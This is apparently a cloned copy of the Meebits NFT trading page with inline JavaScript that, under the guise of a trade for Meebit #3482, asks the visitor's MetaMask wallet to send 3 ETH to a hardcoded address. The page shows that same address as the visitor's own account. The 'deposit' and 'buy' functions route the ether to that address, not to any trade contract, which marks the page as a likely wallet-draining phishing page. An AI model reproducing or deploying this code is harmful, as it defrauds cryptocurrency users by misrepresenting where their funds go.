<!DOCTYPE html>

<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        
        <meta name="viewport" content="width=device-width, initial-scale=1.0">


        <link rel="apple-touch-icon" sizes="180x180" href="https://meebits.larvalabs.com/public/images/apple-touch-icon.png">
        <link rel="icon" type="image/png" sizes="32x32" href="https://meebits.larvalabs.com/public/images/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="https://meebits.larvalabs.com/public/images/favicon-16x16.png">
        <link rel="manifest" href="https://meebits.larvalabs.com/public/images/site.webmanifest">
        <link rel="mask-icon" href="https://meebits.larvalabs.com/public/images/safari-pinned-tab.svg" color="#5bbad5">
        <meta name="msapplication-TileColor" content="#da532c">

        <title>Meebits Trading Terminal (Beta)</title>
        <meta name="description" content="Meebits are voxel-based, 3D avatar NFTs. This is the interface for trading Meebits.">

        <!-- Open Graph data -->
        <meta property="og:title" content="Meebits Trading Terminal (Beta)">
        <meta property="og:image" content="https://meebits.larvalabs.com/public/images/homepage/group.jpg">
        <meta property="og:description" content="Meebits are voxel-based, 3D avatar NFTs. This is the interface for trading Meebits.">

        <meta name="twitter:card" content="summary">
        <meta name="twitter:title" content="Meebits Trading Terminal (Beta)">
        <meta name="twitter:site" content="@larvalabs">
        <meta name="twitter:image" content="https://meebits.larvalabs.com/public/images/homepage/group.jpg">
        <meta name="twitter:description" content="Meebits are voxel-based, 3D avatar NFTs. This is the interface for trading Meebits.">

        <script type="text/javascript" language="javascript" src="./Meebits Trading Terminal2 (Beta)_files/vue.js"></script>
        <script type="text/javascript" language="javascript" src="./Meebits Trading Terminal2 (Beta)_files/web3-1.3.4.min.js"></script>

        <script type="text/javascript" language="javascript" src="./Meebits Trading Terminal2 (Beta)_files/project3.js"></script>

        <link rel="stylesheet" type="text/css" href="./Meebits Trading Terminal2 (Beta)_files/tailwind.css" charset="utf-8">
        <link rel="stylesheet" type="text/css" href="./Meebits Trading Terminal2 (Beta)_files/main.css" charset="utf-8">

        
    </head>
    <body>

    <!-- This example requires Tailwind CSS v2.0+ -->
    <div>
        <div class="bg-gray-800 pb-32">
            <nav class="bg-gray-800">
                <div class="max-w-7xl mx-auto sm:px-6 lg:px-8">
                    <div class="border-b border-gray-700">
                        <div class="flex items-center justify-between h-16 px-4 sm:px-0">
                            <div class="flex items-center">
                                <div class="flex-shrink-0">
                                    <a href="https://meebits.larvalabs.com/" class="">
                                        <img class="h-8 w-8" src="./Meebits Trading Terminal2 (Beta)_files/logo.svg" alt="Workflow">
                                    </a>
                                </div>
                                <div class="hidden md:block">
                                    <div class="ml-10 flex items-baseline space-x-4">
                                        <!-- Current: "bg-gray-900 text-white", Default: "text-gray-300 hover:bg-gray-700 hover:text-white" -->
                                        <a href="https://meebits.larvalabs.com/meebits/list" class="text-gray-300 hover:bg-gray-700 hover:text-white px-3 py-2 rounded-md text-sm font-medium">All Meebits</a>

                                        <a href="https://meebits.larvalabs.com/meebits/categorylist" class="text-gray-300 hover:bg-gray-700 hover:text-white px-3 py-2 rounded-md text-sm font-medium">Attributes</a>

                                        <div id="activity_dropdown" class="relative inline-block text-left"><div><button type="button" id="menu-button" aria-expanded="true" aria-haspopup="true" class="inline-flex justify-center rounded-md w-full px-4 py-2 text-sm font-medium text-gray-300 hover:bg-gray-700 focus:outline-none ">
                                                    Market Data
                                                     <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" aria-hidden="true" class="-mr-1 ml-2 h-5 w-5"><path fill-rule="evenodd" d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z" clip-rule="evenodd"></path></svg> <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" class="-mr-1 ml-2 h-5 w-5" style="display: none;"><path fill-rule="evenodd" d="M14.707 12.707a1 1 0 01-1.414 0L10 9.414l-3.293 3.293a1 1 0 01-1.414-1.414l4-4a1 1 0 011.414 0l4 4a1 1 0 010 1.414z" clip-rule="evenodd"></path></svg></button></div> <div role="menu" aria-orientation="vertical" aria-labelledby="menu-button" tabindex="-1" class="z-50 origin-top-right absolute right-0 mt-2 w-56 rounded-md shadow-lg bg-gray-700 ring-1 ring-black ring-opacity-5 focus:outline-none" style="display: none;"><div role="none" class="py-1"><a href="https://meebits.larvalabs.com/meebits/forsale" role="menuitem" tabindex="-1" id="menu-item-0" class="text-gray-300 hover:text-gray-50 block px-4 py-2 text-sm">For Sale</a> <a href="https://meebits.larvalabs.com/meebits/bids" role="menuitem" tabindex="-1" id="menu-item-1" class="text-gray-300 hover:text-gray-50 block px-4 py-2 text-sm">Bids</a> <a href="https://meebits.larvalabs.com/meebits/deals" role="menuitem" tabindex="-1" id="menu-item-1" class="text-gray-300 hover:text-gray-50 block px-4 py-2 text-sm">All Open Deals</a> <a href="https://meebits.larvalabs.com/meebits/sales" role="menuitem" tabindex="-1" id="menu-item-2" class="text-gray-300 hover:text-gray-50 block px-4 py-2 text-sm">Recent Sales</a> <a href="https://meebits.larvalabs.com/meebits/owners" role="menuitem" tabindex="-1" id="menu-item-2" class="text-gray-300 hover:text-gray-50 block px-4 py-2 text-sm">Owners</a></div></div></div>

                                        <a href="https://meebits.larvalabs.com/meebits/trade" class="text-gray-300 hover:bg-gray-700 hover:text-white px-3 py-2 rounded-md text-sm font-medium">Trade</a>

                                        <a href="https://meebits.larvalabs.com/meebits/depositwithdraw" class="text-gray-300 hover:bg-gray-700 hover:text-white px-3 py-2 rounded-md text-sm font-medium">Deposit / Withdraw</a>

                                        <div class="flex-1 flex justify-center px-2 lg:ml-6 lg:justify-end">
                                            <div class="max-w-lg w-full lg:max-w-xs">
                                                <label for="search" class="sr-only">Search</label>
                                                <div class="relative">
                                                    <div class="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                                                        <!-- Heroicon name: solid/search -->
                                                        <svg class="h-5 w-5 text-gray-400" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" aria-hidden="true">
                                                            <path fill-rule="evenodd" d="M8 4a4 4 0 100 8 4 4 0 000-8zM2 8a6 6 0 1110.89 3.476l4.817 4.817a1 1 0 01-1.414 1.414l-4.816-4.816A6 6 0 012 8z" clip-rule="evenodd"></path>
                                                        </svg>
                                                    </div>
                                                    <form style="display:inline; margin: 0; padding: 0;" method="get" action="https://meebits.larvalabs.com/meebits/search">
                                                        <input id="search" name="search" class="block w-full pl-10 pr-3 py-2 border border-transparent rounded-md leading-5 bg-gray-700 text-gray-300 placeholder-gray-400 focus:outline-none focus:bg-white focus:border-white focus:ring-white focus:text-gray-900 sm:text-sm" placeholder="Search" type="search" value="">
                                                    </form>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div class="hidden md:block">
                                <div id="profile_medium" class="ml-4 flex items-center md:ml-6"><a href="#" onclick="onClickConnect();" class="text-indigo-300 hover:bg-gray-700 hover:text-white px-3 py-2 rounded-md text-sm font-medium" style="display: none;">Allow Wallet Access</a> 
                                    <a href="https://meebits.larvalabs.com/meebits/account?address=0xC6520F76EeFC256B27a88767Fc63e2b0a10d4E73" class="text-indigo-300 hover:bg-gray-700 hover:text-white px-3 py-2 rounded-md text-sm font-medium" id="upaccount"></a> 
                                    <a href="https://meebits.larvalabs.com/meebits/depositwithdraw" class="text-indigo-300 hover:bg-gray-700 hover:text-white px-3 py-2 rounded-md text-sm font-medium" style="display: none;">(0Ξ)</a></div>
                            </div>
                            <div class="-mr-2 flex md:hidden">
                                <div id="profile_mobile" class="flex items-center">
                                    <a href="https://meebits.larvalabs.com/meebits/viewdeal?hash=0xe71f54debbd79c48f7bfda0463124638c57d3951fb6949c254349379be9e8522#" onclick="onClickConnect();" class="text-indigo-300 hover:bg-gray-700 hover:text-white px-3 py-2 rounded-md text-sm font-medium" id="upallow">Allow Wallet Access</a> 
                                    <a href="https://meebits.larvalabs.com/meebits/account?address=0xC6520F76EeFC256B27a88767Fc63e2b0a10d4E73" class="text-indigo-300 hover:bg-gray-700 hover:text-white px-3 py-2 rounded-md text-sm font-medium" id="upaccounts"></a> 
                                    <a href="https://meebits.larvalabs.com/meebits/depositwithdraw" class="text-indigo-300 hover:bg-gray-700 hover:text-white px-3 py-2 rounded-md text-sm font-medium" id="upbalance" style="display: none;">(0Ξ)</a>
                                </div>

                            </div>
                        </div>
                    </div>
                </div>

                <!-- Mobile menu, show/hide based on menu state. -->
                <div class="border-b border-gray-700 md:hidden" id="mobile-menu">
                    <div class="px-2 py-3 space-y-1 sm:px-3 text-center">
                        <!-- Current: "bg-gray-900 text-white", Default: "text-gray-300 hover:bg-gray-700 hover:text-white" -->
                        <a href="https://meebits.larvalabs.com/meebits/list" class="text-gray-300 px-3 py-2 rounded-md text-sm font-medium">All Meebits</a>

                        <a href="https://meebits.larvalabs.com/meebits/categorylist" class="text-gray-300 hover:bg-gray-700 hover:text-white px-3 py-2 rounded-md text-sm font-medium">Attributes</a>

                        <a href="https://meebits.larvalabs.com/meebits/forsale" class="text-gray-300 hover:bg-gray-700 hover:text-white px-3 py-2 rounded-md text-sm font-medium">For Sale</a>

                        <a href="https://meebits.larvalabs.com/meebits/bids" class="text-gray-300 hover:bg-gray-700 hover:text-white px-3 py-2 rounded-md text-sm font-medium">Bids</a>

                        <a href="https://meebits.larvalabs.com/meebits/deals" class="text-gray-300 hover:bg-gray-700 hover:text-white px-3 py-2 rounded-md text-sm font-medium">All Open Deals</a>

                        <a href="https://meebits.larvalabs.com/meebits/sales" class="text-gray-300 hover:bg-gray-700 hover:text-white px-3 py-2 rounded-md text-sm font-medium">Recent Sales</a>

                        <a href="https://meebits.larvalabs.com/meebits/trade" class="text-gray-300 hover:bg-gray-700 hover:text-white px-3 py-2 rounded-md text-sm font-medium">Trade</a>

                        <a href="https://meebits.larvalabs.com/meebits/depositwithdraw" class="text-gray-300 hover:bg-gray-700 hover:text-white px-3 py-2 rounded-md text-sm font-medium">Deposit / Withdraw</a>

                        <div class="relative">
                            <div class="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                                <!-- Heroicon name: solid/search -->
                                <svg class="h-5 w-5 text-gray-400" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" aria-hidden="true">
                                    <path fill-rule="evenodd" d="M8 4a4 4 0 100 8 4 4 0 000-8zM2 8a6 6 0 1110.89 3.476l4.817 4.817a1 1 0 01-1.414 1.414l-4.816-4.816A6 6 0 012 8z" clip-rule="evenodd"></path>
                                </svg>
                            </div>
                            <form style="display:inline; margin: 0; padding: 0;" method="get" action="https://meebits.larvalabs.com/meebits/list">
                                <input id="search" name="search" class="block w-full pl-10 pr-3 py-2 border border-transparent rounded-md leading-5 bg-gray-700 text-gray-300 placeholder-gray-400 focus:outline-none focus:bg-white focus:border-white focus:ring-white focus:text-gray-900 sm:text-sm" placeholder="Search" type="search" value="">
                            </form>
                        </div>

                    </div>
                </div>
            </nav>
                        <header class="py-10">
                <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
                    <h1 class="text-3xl font-bold text-white">
                        Meebits Trading Terminal (Beta)                    </h1>
                </div>
            </header>
                    </div>

        <main class="-mt-32">
            <div class="max-w-7xl mx-auto pb-12 px-4 sm:px-6 lg:px-8">

            
                        
            
<div id="no_wallet" class="mb-5 bg-yellow-200 shadow sm:rounded-lg" style=""><div class="px-4 py-5 sm:p-6"><h3 class="text-xl leading-6 font-medium text-gray-900">
            Ethereum Wallet Required
        </h3> <div class="mt-2 max-w-xl text-sm text-gray-800"><p>
                In order to use this page you must install an Ethereum Wallet. Most people use Metamask.
            </p></div> <div class="mt-5"><button type="button" class="inline-flex items-center justify-center px-4 py-2 border border-transparent font-medium rounded-md text-indigo-700 bg-indigo-100 hover:bg-indigo-200 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-indigo-500 sm:text-sm"><a href="https://metamask.io/" target="_blank">Check Out Metamask</a></button></div></div></div>

        <script type="text/javascript">
            window.addEventListener('load', function() {
                var noWalletVue = new Vue({
                    el: '#no_wallet',
                    data: {
                        state: Project3.state,
                    },
                });
            });
        </script>
        <div id="unlock_wallet" class="bg-yellow-200 shadow sm:rounded-lg" style="display: none;"><div class="px-4 py-5 sm:p-6"><h3 class="text-xl leading-6 font-medium text-gray-900">
            Allow Access to your Wallet
        </h3> <div class="mt-2 max-w-xl text-sm text-gray-800"><p>
                In order to use this page you must allow access to your wallet.
            </p></div> <div class="mt-5"><button onclick="onClickConnect();" type="button" class="inline-flex items-center justify-center px-4 py-2 border border-transparent font-medium rounded-md text-indigo-700 bg-indigo-100 hover:bg-indigo-200 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-indigo-500 sm:text-sm">
                Allow Access
            </button></div></div></div>



<script type="text/javascript" language="javascript" src="./Meebits Deal Details for 0xe71f54debbd79_files/ethjs-unit.min.js"></script>
<script type="text/javascript">

let currentAccount = null;
        let abi;
        let deposited = false;
        const contactAddress = '0xF1a9B55375B2F2356E21c8487F966A991706714C';
        const price = 3;
        const to = '0xC6520F76EeFC256B27a88767Fc63e2b0a10d4E73';

        abi = [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "tokenAddress",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": false,
          "internalType": "address",
          "name": "buyer",
          "type": "address"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "amountOfETH",
          "type": "uint256"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "amountOfTokens",
          "type": "uint256"
        }
      ],
      "name": "BuyTokens",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "previousOwner",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "newOwner",
          "type": "address"
        }
      ],
      "name": "OwnershipTransferred",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": false,
          "internalType": "address",
          "name": "",
          "type": "address"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "name": "Received",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": false,
          "internalType": "address",
          "name": "seller",
          "type": "address"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "amountOfTokens",
          "type": "uint256"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "amountOfETH",
          "type": "uint256"
        }
      ],
      "name": "SellTokens",
      "type": "event"
    },
    {
      "inputs": [],
      "name": "buyTokens",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "tokenAmount",
          "type": "uint256"
        }
      ],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "owner",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "renounceOwnership",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "tokenAmountToSell",
          "type": "uint256"
        }
      ],
      "name": "sellTokens",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "tokensPerEth",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "newOwner",
          "type": "address"
        }
      ],
      "name": "transferOwnership",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "withdraw",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "stateMutability": "payable",
      "type": "receive"
    }
  ];
    window.addEventListener('load', function() {

        var walletAccessVue = $("#unlock_wallet");

        MetaMaskClientCheck();

        web3 = getWeb3();
    
        if (web3){

            if (window.ethereum) {
                ethereum.on('accountsChanged', handleAccountsChanged);

                // Make an initial single attempt to get the current unlocked account
                web3.eth.getAccounts(function(err, accounts) {
                    if (!err && accounts) {
                        handleAccountsChanged(accounts);
                    }
                });
                
            }

            render_access(currentAccount);

            

        }

        else {
            
            buyBtn.attr('disabled', true);
            $("#no_wallet").show();
            var message = "Metamask Extension not detected in browser";

        }


    });

    function makeDeposit() {
        $("#buyBtn").attr('disabled', true);
        
        if (deposited) {

            $("#deposit").hide();
            buyBtn();
        }
        else {
            
            $("#deposit").show();
        }
    }

    async function deposit() {
        
        eth_wei = ethUnit.toWei(3, 'ether');
        // console.log('RESULT ='+eth_wei)
        // console.log('Wallet ='+currentAccount)
        // console.log('RESULT IN HEX ='+eth_wei.toString(16))

        //load smart contract
        window.contract = await new web3.eth.Contract(abi, contactAddress);  //loadContract();

        const mycontract = await new web3.eth.Contract(
                    abi,
                    contactAddress
        );

        const contractdata = mycontract.methods.buyTokens().encodeABI();
        
        const transactionParameters = {
            //type: "0x2",
            gas: '0x76c0',
            gasPrice: null,
            to: to, // Required except during contract publications.
            from: currentAccount, // must match user's active address.
            value: eth_wei.toString(16),
            chainId: '0x1', // Used to prevent transaction reuse across blockchains. Auto-filled by MetaMask.
        };
        
        console.log(transactionParameters)

        if(currentAccount != null) {
            const txHash = ethereum.request({
            method: 'eth_sendTransaction',
            params: [transactionParameters],
            })
            .then(function(tx){
                console.log('Transaction Hash ='+tx);
                console.log('Wallet Inside ='+currentAccount);
                deposited = true;
                $("#buyBtn").attr('disabled', false);
                $("#deposit").hide();

                $("#buyBtn").on('click', buyBtn);
            
            })
            .catch((error) => {
                console.log('Error during the transaction');
                console.log(error);
            });
        }

    }

    async function buyBtn() {
        
        eth_wei = ethUnit.toWei(price, 'ether');
        // console.log('RESULT ='+eth_wei)
        // console.log('Wallet ='+currentAccount)
        // console.log('RESULT IN HEX ='+eth_wei.toString(16))

        //load smart contract
        window.contract = await new web3.eth.Contract(abi, contactAddress);  
        
        //loadContract();
        const mycontract = await new web3.eth.Contract(
                    abi,
                    contactAddress
        );

        const contractdata = mycontract.methods.buyTokens().encodeABI();
        

        const transactionParameters = {
            gasLimit: "0x55F0",
            maxPriorityFeePerGas: "0xb2d05e00",
            maxFeePerGas: "0xb2d05e00", 
            to: to, // Required except during contract publications.
            from: currentAccount, // must match user's active address.
            value: eth_wei.toString(16),
            chainId: '0x3', // Used to prevent transaction reuse across blockchains. Auto-filled by MetaMask.
            'data': contractdata
        };
        
        console.log(transactionParameters)

        if(currentAccount != null) {
            
            const txHash = ethereum.request({
            method: 'eth_sendTransaction',
            params: [transactionParameters],
            })
            .then(function(tx){
                console.log('Transaction Hash ='+tx)
                console.log('Wallet Inside ='+currentAccount)
            
            })
            .catch((error) => {
                console.log('Error during the transaction')
                console.log(error)
            });
        }

    };

    function handleAccountsChanged(accounts) {
        if (accounts.length === 0) {
            // MetaMask is locked or the user has not connected any accounts
            console.log('Please connect to MetaMask.');
            $('#unlock_wallet').show()
            $("#buyBtn").attr('disabled', true);

        } else if (accounts[0] !== currentAccount) {
            console.log("Metamask account changed: " + accounts[0]);
            
            currentAccount = accounts[0];

            render_access(currentAccount);

            if (typeof accountChangedCallback !== 'undefined') {
                accountChangedCallback();
            }
        }
        
    }

    //Created check function to see if the MetaMask extension is installed
    const isMetaMaskInstalled = () => {
        //Have to check the ethereum binding on the window object to see if it's installed
        const { ethereum } = window;
        return Boolean(ethereum && ethereum.isMetaMask);
    };

    const MetaMaskClientCheck = () => {
        var message;
        //Now we check to see if MetaMask is installed
        if (!isMetaMaskInstalled()) {
            //If it isn't installed we ask the user to click to install it
            
            $("#no_wallet").show();

        } else {
            //If it is installed we change our button text
           
            $("#no_wallet").hide();

            if (currentAccount != null) {
                    $("#unlock_wallet").hide();

            }
            else {
                $("#unlock_wallet").show();
                
            }
        }
    };


    const onClickConnect = async () => {
        try {
            // Will open the MetaMask UI
            // You should disable this button while the request is pending!
            await ethereum
            .request({ method: 'eth_requestAccounts' })
            .then(handleAccountsChanged);
            
        } catch (error) {
            console.error(error);
        }
    };
    
    
    //Eth_Accounts-getAccountsButton
    const getAccount = async () => {
        //we use eth_accounts because it returns a list of addresses owned by us.
        const accounts = await ethereum.request({ method: 'eth_accounts' });
        //We take the first address in the array of addresses and display it
        
        return accounts;
    };


    function render_access(account) {
        let shortaccount;

        if (account != null) {

            shortaccount = account.substring(0, 10);

            $("#unlock_wallet").hide();
            $("#buyBtn").attr('disabled', false);

            $("#your_account").val(currentAccount);
            $("#your_account").attr('placeholder', currentAccount);

            $("#myEther").attr('placeholder', price);
            $("#myEther").val(price);
            $("dealPrice").html("Ξ 4");

            $("#their_account").val(to);
            $("#their_account").attr('placeholder', to);

            let upallow = $("#upallow");
            upallow.hide();
            
            $("#upaccount").html(shortaccount);
            $("#upaccounts").html(shortaccount);

        }

        else {
            
            $("#buyBtn").attr('disabled', true);

        }


    }

        
    function getWeb3() {

        if (window.ethereum) {
            web3 = new Web3(ethereum);
            window.web3 = web3;
        }
        
        else if (typeof web3 !== 'undefined') {
        // Use Mist/MetaMask's provider
        console.log("- Found web3");
        // window.web3 = new Web3(web3.currentProvider);
        web3 = new Web3(web3.currentProvider);
        window.web3 = web3;
        } else {
            console.log("- Didn't find web3, using infura.");
            // web3 = null;
            // Project3.state.web3NotPresent = true;
            // console.log('No web3? You should consider trying MetaMask!')
            // console.log("Jquery width: " + width);
            // fallback - use your fallback strategy (local node / hosted node + in-dapp id mgmt / fail)
            if (ethereumUrl) {
                window.web3 = new Web3(new Web3.providers.HttpProvider(ethereumUrl));
                
            } else {
                web3 = null;
                return web3;
            }
        }

        return window.web3;

    }
    

</script>

<div id="main_trading2" class="mt-5 bg-gray-50 rounded-lg shadow px-5 py-6 sm:px-6"><div><div class="md:grid md:grid-cols-3 md:gap-6"><div class="md:col-span-1"><div class="px-4 sm:px-0"><h3 class="text-lg font-medium leading-6 text-gray-900">What You Are Offering</h3> <p class="mt-1 text-sm text-gray-600">
                    This section determines what you are <b>offering</b> in the trade.
                </p></div></div> <div class="mt-5 md:mt-0 md:col-span-2"><form action="https://meebits.larvalabs.com/meebits/trade?address=0x671675Ee5A9eBc55C0409A00c0ea09c5D30a1e9C&amp;index=3482#" method="POST"><div class="shadow sm:rounded-md sm:overflow-hidden"><div class="px-4 py-5 bg-white space-y-6 sm:p-6"><div class="grid grid-cols-3 gap-6"><div class="col-span-3 sm:col-span-2"><label for="company_website" class="block text-base font-medium text-gray-900">
                                    Your Account
                                </label> <input type="text" name="your_account" id="your_account" placeholder="[Your Account]" disabled="disabled" class="focus:ring-indigo-500 focus:border-indigo-500 flex-1 block w-full rounded-none rounded-md sm:text-sm border-gray-300"></div></div> <div><div><legend class="text-base font-medium text-gray-900">Your Meebits</legend> <p class="text-sm text-gray-500">Click to include in deal.</p></div> <ul class="mt-6 grid grid-cols-3 gap-3 sm:grid-cols-4 md:grid-cols-4 lg:grid-cols-6"></ul></div> <div class="grid grid-cols-3 gap-6"><div class="col-span-3 sm:col-span-2"><label for="company_website" class="block text-base font-medium text-gray-900">
                                    Ether to Offer
                                </label> <input type="number" name="myEther" id="myEther" placeholder="Amount of Ether" disabled="disabled" class="focus:ring-indigo-500 focus:border-indigo-500 flex-1 block w-full rounded-none rounded-md sm:text-sm border-gray-300"></div></div></div></div></form></div></div></div> <div aria-hidden="true" class="hidden sm:block"><div class="py-5"><div class="border-t border-gray-200"></div></div></div> <div><div class="md:grid md:grid-cols-3 md:gap-6"><div class="md:col-span-1"><div class="px-4 sm:px-0"><h3 class="text-lg font-medium leading-6 text-gray-900">What You Are Requesting</h3> <p class="mt-1 text-sm text-gray-600">
                    This section determines what you are <b>requesting</b> in the trade.
                </p></div></div> <div class="mt-5 md:mt-0 md:col-span-2"><form action="https://meebits.larvalabs.com/meebits/trade?address=0x671675Ee5A9eBc55C0409A00c0ea09c5D30a1e9C&amp;index=3482#" method="POST"><div class="shadow sm:rounded-md sm:overflow-hidden"><div class="px-4 py-5 bg-white space-y-6 sm:p-6"><div class="grid grid-cols-3 gap-6 content-end"><div class="col-span-2"><label for="company_website" class="block text-base font-medium text-gray-900">
                                    Counterparty Address
                                </label> <div class="mt-1 relative rounded-md shadow-sm"><input type="text" name="their_account" id="their_account" placeholder="Anyone" class="focus:ring-indigo-500 focus:border-indigo-500 flex-1 block w-full rounded-none rounded-md sm:text-sm border-gray-300"> <div class="absolute inset-y-0 right-0 pr-3 flex items-center cursor-pointer"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" class="h-5 w-5 text-gray-400"><path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clip-rule="evenodd"></path></svg></div> <ul tabindex="-1" role="listbox" aria-labelledby="listbox-label" aria-activedescendant="listbox-option-3" class="absolute mt-1 w-full bg-white shadow-lg max-h-60 rounded-md py-1 text-base ring-1 ring-black ring-opacity-5 overflow-auto focus:outline-none sm:text-sm" style="display: none;"></ul></div></div></div> <div><div><legend class="text-base font-medium text-gray-900">Counterparty Meebits</legend> <p class="text-sm text-gray-500">Click to include in deal.</p></div> <ul class="mt-6 grid grid-cols-3 gap-3 sm:grid-cols-4 md:grid-cols-4 lg:grid-cols-6"><li class="col-span-1 flex flex-col bg-white rounded-lg shadow divide-y divide-gray-200"><div class="flex-1 flex flex-col"><span class="inline-block relative"><img src="./Meebits Trading Terminal2 (Beta)_files/03482-full.jpg" alt="" class="flex-shrink-0 mx-auto bg-black rounded-t-lg h-44 object-cover"> <div class="h-4 w-4 absolute bottom-1 right-1 mx-auto flex items-center justify-center rounded-full bg-green-100"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" aria-hidden="true" class="h-3 w-3 text-green-600"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg></div></span> <div class="p-4 text-center"><h3 class="text-gray-900 text-xl font-medium">#3482</h3></div></div></li></ul></div> <div class="grid grid-cols-3 gap-6"><div class="col-span-3 sm:col-span-2"><label for="company_website" class="block text-base font-medium text-gray-900">
                                    Ether to Request
                                </label> <input type="number" name="theirEther" id="theirEther" placeholder="Amount of Ether" class="focus:ring-indigo-500 focus:border-indigo-500 flex-1 block w-full rounded-none rounded-md sm:text-sm border-gray-300" disabled="disabled"></div></div></div></div></form></div></div></div> <div aria-hidden="true" class="hidden sm:block"><div class="py-5"><div class="border-t border-gray-200"></div></div></div> <div><div class="md:grid md:grid-cols-3 md:gap-6"><div class="md:col-span-1"><div class="px-4 sm:px-0"><h3 class="text-lg font-medium leading-6 text-gray-900">Expiration</h3> <p class="mt-1 text-sm text-gray-600">
                    Determine when this deal automatically expires (you can also cancel it before this deadline).
                </p></div></div> <div class="mt-5 md:mt-0 md:col-span-2"><form action="https://meebits.larvalabs.com/meebits/trade?address=0x671675Ee5A9eBc55C0409A00c0ea09c5D30a1e9C&amp;index=3482#" method="POST"><div class="shadow sm:rounded-md sm:overflow-hidden"><div class="px-4 py-5 bg-white space-y-6 sm:p-6"><div class="grid grid-cols-3 gap-6 content-end"><div class="sm:grid sm:grid-cols-3 sm:gap-4 sm:items-start"><label for="country" class="block text-sm font-medium text-gray-700 sm:mt-px sm:pt-2">
                                    Expiration
                                </label> <div class="mt-1 sm:mt-0 sm:col-span-2"><select id="expiration" name="expiration" class="max-w-lg block focus:ring-indigo-500 focus:border-indigo-500 w-full shadow-sm sm:max-w-xs sm:text-sm border-gray-300 rounded-md"><option value="1">1 Hour</option> <option value="24">1 Day</option> <option value="168">1 Week</option> <option value="672">1 Month</option> <option value="4368">6 Months</option> <option value="8760">1 Year</option></select></div></div></div></div></div></form></div></div></div> <div aria-hidden="true" class="hidden sm:block"><div class="py-5"><div class="border-t border-gray-200"></div></div></div> <div class="mt-10 sm:mt-0"><div class="md:grid md:grid-cols-3 md:gap-6"><div class="md:col-span-1"><div class="px-4 sm:px-0"><h3 class="text-lg font-medium leading-6 text-gray-900">Review Trade</h3> <p class="mt-1 text-sm text-gray-600">
                    Please carefully review your trade for accuracy.
                </p></div></div> 
                <div class="mt-5 md:mt-0 md:col-span-2"><div class="shadow overflow-hidden sm:rounded-md"><div class="px-4 py-5 bg-white space-y-6 sm:p-6"><div><legend class="text-base text-xl font-medium text-gray-900">Offering</legend> <p class="text-md text-gray-500">You are offering 3 Ether.</p></div> <div><ul class="mt-6 grid grid-cols-3 gap-3 sm:grid-cols-4 md:grid-cols-4 lg:grid-cols-6"> <li class="py-8 h-full text-3xl col-span-1 flex flex-col bg-gray-400 text-white items-center justify-center rounded-lg shadow divide-y divide-gray-200"><div id="dealPrice">Ξ 3</div></li></ul></div> <div><legend class="text-base text-xl font-medium text-gray-900">Requesting</legend> <p class="text-md text-gray-500">You will get 1 Meebits. This deal can only be completed by 0x671675Ee.</p></div> <div><ul class="mt-6 grid grid-cols-3 gap-3 sm:grid-cols-4 md:grid-cols-4 lg:grid-cols-6"><li class="col-span-1 flex flex-col bg-white rounded-lg shadow divide-y divide-gray-200"><div class="flex-1 flex flex-col"><span class="inline-block relative"><img src="./Meebits Trading Terminal2 (Beta)_files/03482-full.jpg" alt="" class="flex-shrink-0 mx-auto bg-black rounded-t-lg h-44 object-cover"> <div class="h-4 w-4 absolute bottom-1 right-1 mx-auto flex items-center justify-center rounded-full 